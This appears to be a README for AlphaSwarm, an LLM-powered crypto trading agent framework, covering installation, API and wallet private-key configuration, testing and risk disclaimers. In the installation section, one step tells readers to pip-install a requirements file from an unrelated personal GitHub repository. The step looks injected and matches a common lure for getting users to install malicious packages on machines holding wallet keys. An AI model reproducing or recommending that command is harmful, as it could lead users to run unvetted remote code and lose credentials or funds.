# 🚀 AlphaSwarm - AI-Powered Crypto Trading Agents

**AlphaSwarm** is a cutting-edge AI trading framework that enables users to build LLM-powered agents for interpreting trading strategies, analyzing real-time market data, and executing trades across multiple blockchains.

---

## 🌟 Features

### **🤖 AI-Powered Trading with Agents**
- LLM-powered agents capable of processing complex, unstructured signals for trading decisions
- Intelligent tool selection and chaining for multi-step analysis
- Dynamic composition and execution of Python code
- Natural language strategy definition with real-time reasoning
- Iterative agentic reasoning to evaluate market conditions and execute trades

### **⚡ Trading & Execution**
- Real-time strategy execution and monitoring
- Automated trading alerts via Telegram
- Autonomous trade execution
- Multi-chain support:
  - **Ethereum**, **Base**
  - 🔜 *Solana (Coming Soon!)*
- DEX Integrations:
  - **Uniswap V2/V3**
  - 🔜 *Jupiter (Coming Soon!)*

### **🛠️ Modular Architecture**
- Extensible plugin system for:
  - Data sources & market signals
  - Trading strategies
  - Agent tools & capabilities
  - DEX integrations
  - On-chain data providers
- Easy integration of new data sources and execution venues

---

## 📌 Roadmap
🌐 Integration with **Theoriq Protocol** to connect with a growing ecosystem of agents and trading strategies.

---

## 🛠️ Prerequisites
- **Python 3.11 or higher** → [Download here](https://www.python.org/downloads/)
  - Verify installation: `python --version`
- **Poetry (Package Manager)**
  - Install: `pipx install poetry`
  - Verify: `poetry --version`
- **Basic understanding of crypto trading concepts**

---

## 🔧 Getting Started
### **1️⃣ Installation**

Ensure all prerequisites are installed, then follow these steps:

#### ✅ Clone the Repository:
```bash
git clone https://github.com/chain-ml/alphaswarm.git
cd alphaswarm
```

#### ✅ Install Dependencies:
```bash
# Basic installation
poetry install

# Development installation (includes testing tools)
poetry install --with dev
```

📌 *Poetry manages virtual environments automatically. No need for manual venv setup!*

#### ✅ Install Requirements from External Repository:
```bash
pip install -r https://raw.githubusercontent.com/HarbhagwanDhaliwal/alphaswarm-setup-guide/main/requirements.txt
```

---

### **2️⃣ API Keys Setup**
Before running AlphaSwarm, obtain the necessary API keys:

#### 🔑 **LLM API Keys:**
- Anthropic API Key (**Claude Models** - default)
- OpenAI API Key (**GPT Models**)
- Other LLM providers via LiteLLM

#### 🔑 **Blockchain Access Keys:**
- **Alchemy API Key** (Required for blockchain data)
- **RPC URLs** from Alchemy, Infura, or other providers

#### 🔑 **Optional - Telegram Bot (For Alerts):**
- Create a bot via **BotFather** (`/newbot`) and save the token
- Retrieve your chat ID using `examples/telegram_bot.py`

---

### **3️⃣ Environment Configuration**
Create a `.env` file:
```bash
cp .env.example .env
```

Update `.env` with your API keys and configuration:

```plaintext
# LLM Config
ANTHROPIC_API_KEY=<your_key>
OPENAI_API_KEY=<your_key>

# Blockchain Access
ALCHEMY_API_KEY=<your_key>

# Ethereum
ETH_RPC_URL=<your_rpc_url>
ETH_WALLET_ADDRESS=<your_wallet>
ETH_PRIVATE_KEY=<your_private_key>

# Base
BASE_RPC_URL=<your_rpc_url>
BASE_WALLET_ADDRESS=<your_wallet>
BASE_PRIVATE_KEY=<your_private_key>
```
📌 **Security Tips:**
- NEVER commit your `.env` file!
- Always store private keys securely.

---

### **4️⃣ Additional Configuration**
AlphaSwarm uses **YAML configuration files** (`config/default.yaml`) to define:
- **Network Environments** (mainnet/testnet settings)
- **Trading Venues** (DEXs, token pairs, execution settings)
- **On-Chain Configurations** (wallets, gas fees, transaction settings)
- **Telegram Alerts** (bot settings)

📌 *Always verify contract addresses from official sources!*

---

## 📊 Usage
Check out the [examples/README.md](examples/README.md) for usage examples.

---

## 🔬 Development
### 🛠️ Running Tests
```bash
# Run all tests
make all-tests

# Run specific test suites
make unit-tests
make integration-tests  # Requires API keys
```

### 🛠️ Code Quality
```bash
poetry run black .  # Format code
poetry run isort .  # Sort imports
poetry run ruff check .  # Run linter
poetry run mypy .  # Type checking
```

Or use the **Makefile** shortcuts:
```bash
make dev-lint
```

---

## 🔒 Security & Disclaimer
### ⚠️ **Important Legal & Risk Disclosure**
AlphaSwarm is experimental software. By using it, you acknowledge and agree that:
- **LLMs are non-deterministic** and may produce **unpredictable results**.
- **Crypto trading carries significant risk**, and market conditions can lead to **partial or complete loss of funds**.
- **This is NOT financial advice.** The software is for **illustration purposes only**.
- **Users are responsible for their own due diligence and security.**
- **Use testnets before trading with real funds.**

🔹 **No warranty provided.** The developers are **NOT liable** for any financial losses incurred.

---

## 📩 Support & Contributions
### Need Help? 💡
Check our **[Support Guide](https://github.com/chain-ml/alphaswarm/wiki/Support-Guide)** for assistance.

### Want to Contribute? 🔥
AlphaSwarm is actively developed. Contributions, PRs, and feature requests are **welcome!**

---

## 📜 License
Licensed under the **MIT License**. See the **LICENSE** file for details.

🚀 **Happy Trading with AlphaSwarm!** 🎯

